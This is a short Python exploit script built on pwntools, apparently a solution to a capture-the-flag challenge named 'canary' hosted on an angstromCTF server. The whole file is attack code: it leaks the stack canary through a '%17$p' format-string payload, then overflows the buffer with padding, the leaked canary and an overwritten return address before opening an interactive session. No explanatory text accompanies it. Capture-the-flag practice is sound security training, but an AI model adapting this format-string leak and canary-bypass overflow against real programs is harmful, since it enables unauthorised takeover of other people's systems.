#!/usr/bin/env python3
from pwn import *

# p = process('./canary')
p = remote('shell.actf.co', 20701)

payload = b'%17$p'
p.sendlineafter(b'name? ', payload)

p.recvuntil(b'meet you, ')
canary = int(p.recvuntil(b'!', drop=True), 16)

log.info('canary {:#x}'.format(canary))

payload = b'A' * 0x38 + p64(canary) + b'A' * 0x8 + p64(0x40078b)
p.sendlineafter(b'me? ', payload)

p.interactive()
